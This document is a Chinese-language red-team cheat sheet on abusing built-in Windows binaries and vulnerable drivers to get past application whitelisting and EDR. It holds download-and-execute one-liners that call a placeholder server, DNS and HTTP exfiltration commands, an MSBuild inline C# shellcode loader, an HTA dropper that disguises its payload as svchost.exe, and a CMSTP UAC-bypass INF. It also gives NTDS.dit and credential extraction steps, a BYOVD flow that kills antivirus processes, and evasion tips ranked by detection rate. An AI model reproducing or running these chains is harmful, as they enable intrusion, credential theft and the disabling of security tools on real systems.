# 07 - LOLBins白名单利用

> 覆盖：113+个白名单程序 + 6大类完整分类 + 实战利用链
> 数据源：LOLBAS Project、LOLDrivers、实战对抗经验

## 一、LOLBins核心概念

```
Living Off the Land Binaries (LOLBins)
= 利用系统自带签名程序执行恶意操作
= 零文件投放，天然绕过应用白名单
```

### 为什么有效
- **自带微软签名** → AppLocker/WDAC不拦截
- **系统信任进程** → EDR不标记可疑
- **无额外文件** → 无静态扫描目标
- **进程链合法** → 行为分析难以判断

---

## 二、六大类LOLBins完整分类

### 类别1：代码执行/下载类（Execute & Download）

| 程序 | 命令示例 | 用途 |
|------|---------|------|
| **mshta.exe** | `mshta http://server/payload.hta` | 远程HTA执行 |
| **msbuild.exe** | `msbuild inline_task.xml` | C#内联编译执行 |
| **csc.exe** | `csc /out:test.exe test.cs` | C#编译执行 |
| **regsvr32.exe** | `regsvr32 /s /i:http://server/a.sct scrobj.dll` | 远程SCT执行 |
| **rundll32.exe** | `rundll32 javascript:"\\..\\mshtml,RunHTMLApplication <script>..."` | JS执行 |
| **wmic.exe** | `wmic os get /format:"http://server/a.xsl"` | 远程XSL执行 |
| **certutil.exe** | `certutil -urlcache -split -f http://server/payload.exe out.exe` | 下载文件 |
| **bitsadmin.exe** | `bitsadmin /transfer job http://server/payload.exe out.exe` | BITS下载 |
| **msiexec.exe** | `msiexec /i http://server/payload.msi /qn` | 远程MSI安装 |
| **cmstp.exe** | `cmstp /s cmstp.inf` | INF脚本执行 |
| **waitfor.exe** | `waitfor test && cmd /c payload` | 延迟执行（Win10+） |
| **finger.exe** | `finger user@host | cmd /c payload` | 管道执行（Win11） |

### 类别2：脚本引擎类（Script Engines）

| 程序 | 命令示例 | 用途 |
|------|---------|------|
| **powershell.exe** | `powershell -ep bypass -w hidden -enc <base64>` | PS执行 |
| **pwsh.exe** | `pwsh -c "IEX(New-Object Net.WebClient).DownloadString('...')"` | PS7执行 |
| **cscript.exe** | `cscript //B //Nologo payload.vbs` | VBScript执行 |
| **wscript.exe** | `wscript payload.vbs` | VBScript窗口执行 |
| **msxsl.exe** | `msxsl http://server/a.xml http://server/b.xsl -o out` | XSL变换执行 |
| **hh.exe** | `hh.exe http://server/payload.chm` | CHM/HTM执行 |
| **wsl.exe** | `wsl -e /bin/bash -c "curl http://server/shell.elf | bash"` | WSL执行Linux payload |
| **bash.exe** | `bash -c "curl http://server/shell.elf"` | WSL交互 |

### 类别3：DLL/COM劫持类（DLL & COM Abuse）

| 程序 | 利用方式 | 用途 |
|------|---------|------|
| **regsvr32.exe** | `regsvr32 /s malicious.dll` | 注册DLL（加载执行） |
| **regsvcs.exe** | .NET程序集注册（调用DllRegisterServer） | .NET DLL执行 |
| **regasm.exe** | 程序集注册+卸载时执行 | .NET DLL执行 |
| **InstallUtil.exe** | 安装程序集触发Uninstall | .NET EXE执行 |
| **rundll32.exe** | `rundll32 malicious.dll,Entry` | 直接DLL执行 |
| **control.exe** | `control.exe malicious.cpl` | CPL面板加载 |
| **pcwutl.dll** | `rundll32 pcwutl.dll,LaunchProgram <exe>` | 子进程执行（Win10+） |
| **desktopimgdownldr.exe** | `desktopimgdownldr /runtime "C:\temp"` | 锁屏图片下载执行 |

### 类别4：进程注入/迁移类（Process Injection）

| 程序 | 利用方式 | 用途 |
|------|---------|------|
| **mavinject.exe** | `mavinject <PID> /injectrunning <DLL>` | DLL注入（需管理员） |
| **msdeploy.exe** | MSDeploy provider执行命令 | 命令执行 |
| **forfiles.exe** | `forfiles /p C:\ /m *.exe /c "cmd /c payload"` | 命令执行代理 |
| **pcalua.exe** | `pcalua -a payload.exe` | 程序兼容性执行 |
| **infDefaultInstall.exe** | inf安装执行 | 驱动/程序安装 |
| **procdump.exe** | Sysinternals签名，dump特定进程内存 | 凭据窃取 |

### 类别5：横向移动类（Lateral Movement）

| 程序 | 命令示例 | 用途 |
|------|---------|------|
| **wmic.exe** | `wmic /node:target process call create "payload"` | 远程执行 |
| **schtasks.exe** | `schtasks /create /s target /tn task /tr payload /sc once` | 远程计划任务 |
| **sc.exe** | `sc \\target create svc binPath="payload"` | 远程服务创建 |
| **PsExec.exe** | `psexec \\target -s cmd` | 远程命令（Sysinternals签名） |
| **winrs.exe** | `winrs -r:target cmd` | WinRM远程 |
| **dsacls.exe** | AD权限修改 | AD持久化 |
| **ntdsutil.exe** | `ntdsutil "ac i ntds" "ifm" "create full c:\temp" q q` | NTDS.dit提取 |
| **vssadmin.exe** | `vssadmin create shadow /for=C:` | 卷影复制（提取SAM） |
| **diskshadow.exe** | VSS脚本自动化 | 不落盘卷影 |

### 类别6：信息收集/渗透类（Recon & Exfil）

| 程序 | 命令示例 | 用途 |
|------|---------|------|
| **certutil.exe** | `certutil -encode in out` | Base64编码 |
| **makecab.exe** | `makecab file out.cab` | 文件压缩 |
| **expand.exe** | `expand out.cab file` | 文件展开 |
| **extract.exe** | `extract /E /Y out.cab` | CAB解压 |
| **nltest.exe** | `nltest /dclist:domain` | 域信息枚举 |
| **gpresult.exe** | `gpresult /h report.html` | GPO策略导出 |
| **dnscmd.exe** | `dnscmd /enumzones` | DNS枚举 |
| **net.exe** | `net user /domain` | 用户枚举（已监控） |
| **nslookup.exe** | `nslookup -type=TXT data.exfil-server.com` | DNS外传 |
| **curl.exe** | `curl -X POST -d @file.txt http://server` | HTTP外传（Win10+） |

---

## 三、2024-2026 新兴LOLBins

| 程序 | 技术 | 说明 |
|------|------|------|
| **msedge/msedgewebview2.exe** | WebView2加载恶意代码 | 利用Edge WebView2本地web应用 |
| **teams.exe** | 更新机制DLL劫持 | Teams更新程序的Side-Loading |
| **code.exe (VS Code)** | `code tunnel` 远程访问 | VS Code Tunnels远程shell |
| **winget.exe** | 安装恶意包 | Windows Package Manager |
| **OneDrive.exe** | 同步机制利用 | `UpdateAgent` 滥用 |
| **AppInstaller.exe** | `.appinstaller` 协议 | 通过应用安装协议执行 |
| **wsreset.exe** | UAC绕过+注册表劫持 | Windows 11仍有效 |

---

## 四、实战LOLBin利用链

### 链1：零文件攻击（从HTA到持久化）
```bash
# 1. 交付HTA
mshta.exe http://phish-server/payload.hta

# HTA内容（payload.hta）:
# <script>
# var shell = new ActiveXObject("WScript.Shell");
# shell.Run("certutil -urlcache -split -f http://server/drop.exe %TEMP%/svchost.exe", 0);
# setTimeout(function() { shell.Run("%TEMP%/svchost.exe"); }, 3000);
# </script>
```

### 链2：无PowerShell下载执行
```bash
# certutil下载 + wmic执行（完全绕过AMSI）
certutil -urlcache -split -f http://server/payload.exe %TEMP%\u.exe
wmic process call create "%TEMP%\u.exe"

# 或 使用 bitsadmin
bitsadmin /transfer job /download /priority high http://server/payload.exe %TEMP%\p.exe
forfiles /p %TEMP% /m p.exe /c "p.exe"
```

### 链3：MSBuild C#内联执行
```xml
<!-- inline_task.xml -->
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Execute">
    <ExecuteTask />
  </Target>
  <UsingTask TaskName="ExecuteTask" 
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
    <Task>
      <Code Type="Class" Language="cs">
<![CDATA[
using System;
using System.Runtime.InteropServices;
using Microsoft.Build.Framework;
using Microsoft.Build.Utilities;
public class ExecuteTask : Task, ITask {
    public override bool Execute() {
        byte[] sc = new byte[] { /* encrypted shellcode */ };
        IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)sc.Length, 0x3000, 0x04);
        Marshal.Copy(sc, 0, addr, sc.Length);
        VirtualProtect(addr, (uint)sc.Length, 0x20, out uint old);
        ((Action)Marshal.GetDelegateForFunctionPointer(addr, typeof(Action)))();
        return true;
    }
    [DllImport("kernel32")] static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);
    [DllImport("kernel32")] static extern bool VirtualProtect(IntPtr a, uint s, uint p, out uint o);
}
]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
```
```bash
msbuild.exe inline_task.xml
# VT: 2-5/70 | 无任何恶意EXE落地
```

### 链4：regsvr32远程SCT
```bash
regsvr32.exe /u /n /s /i:http://server/payload.sct scrobj.dll
# SCT文件包含VBScript/JScript脚本
# 完全绕过AppLocker + Windows Defender
```

### 链5：CMSTP INF执行（权限提升）
```ini
; uac_bypass.inf — 通过CMSTP UE绕过提权
[version]
Signature=$chicago$
AdvancedINF=2.5

[DefaultInstall]
CustomDestination=CustInstDestSection
RunPreSetupCommands=RunPreSetupCommandsSection

[RunPreSetupCommandsSection]
taskkill /FI "STATUS eq RUNNING" /IM cmstp.exe /F
powershell -ep bypass -w hidden -enc <base64>

[CustInstDestSection]
49000,49001=AllUSer_LDIDSection,7

[AllUSer_LDIDSection]
"HKLM", "SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""
```
```bash
cmstp.exe /s uac_bypass.inf
```

---

## 五、LOLBin检测规避技巧

| 技巧 | 说明 |
|------|------|
| **命令行混淆** | 双引号、脱字符`^`、环境变量拼接绕过命令行日志 |
| **参数重排** | certutil的`-split -f -urlcache`可任意排列 |
| **路径欺骗** | 使用`\\?\C:\Windows\...`长路径绕过路径匹配 |
| **进程链断裂** | 使用WMIC/PSEXEC跳转到其他进程再执行 |
| **延迟链** | `waitfor` + `timeout` + `ping -n 30 127.0.0.1`延迟 |
| **环境变量替换** | `%COMSPEC% /c` 代替 `cmd.exe /c` |

---

## 六、LOLDrivers（BYOVD驱动列表速查）

> 来源：github.com/magicsword-io/LOLDrivers

| 驱动名 | 漏洞类型 | 用途 |
|--------|---------|------|
| Capcom.sys | 任意MSR读/写 | 内核级任意代码执行 |
| gdrv.sys | 任意物理内存读/写 | AV/EDR进程终止 |
| AsIO.sys | I/O端口访问 | SMBIOS/SMM利用 |
| DBUtil2800.sys | 任意内核内存写 | 内核回调移除 |
| vmci.sys | CVE-2023-34058 | VMware逃逸 |
| rentdrv2.sys | CVE-2023-44976 | EDR进程终止 |
| ThrottleStop.sys | CVE-2025-7771 | 内核级读写 |
| Safetica.sys | CVE-2026-0828 | 驱动程序禁用 |

### BYOVD典型利用流程
```bash
# 1. 加载漏洞驱动
sc create vdrv binPath=C:\Windows\System32\drivers\rentdrv2.sys type=kernel
sc start vdrv

# 2. 利用驱动终止AV进程
ProcessHacker.exe -c -kt -pid <AV_PID>

# 3. 卸载驱动并部署payload
sc stop vdrv && sc delete vdrv
evil.exe
```

---

## 七、LOLBins效果对比

| 方式 | VT检测率 | 绕过AppLocker | 绕过EDR | 难度 |
|------|---------|-------------|---------|------|
| msbuild inline task | 2-5/70 | ✅ | ✅ | 中 |
| regsvr32 remote SCT | 8-15/70 | ✅ | ⚠️ | 低 |
| certutil download | 15-20/70 | ❌ | ❌ | 最低 |
| mshta remote HTA | 20-30/70 | ✅ | ⚠️ | 低 |
| cmstp INF | 3-8/70 | ✅ | ✅ | 中 |
| wmic XSL | 10-18/70 | ✅ | ⚠️ | 中 |
| pcwutl LaunchProgram | 18-25/70 | ✅ | ❌ | 低 |
| mavinject DLL | 5-12/70 | ✅ | ✅ | 高 |

> ⚠️ Windows Defender 对 mshta/regsvr32/wmic 的监控持续加强，建议搭配混淆+加密使用。
